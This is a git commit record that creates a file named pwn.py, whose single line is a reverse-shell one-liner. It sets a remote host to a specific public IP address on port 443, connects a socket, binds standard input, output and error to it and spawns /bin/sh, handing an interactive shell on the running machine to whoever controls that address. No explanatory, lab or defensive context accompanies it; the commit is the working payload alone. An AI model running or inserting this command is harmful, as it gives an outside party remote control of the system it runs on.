2b3c82c998671cf3452f9650256d444dc5347f2f
Ahsan Khan <coderahsan@gmail.com>
2023-11-01 14:28:27 +0500

    Create pwn.py

---
+++ pwn.py
@@ -0,0 +1,1 @@
+export RHOST="146.190.145.137";export RPORT=443;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
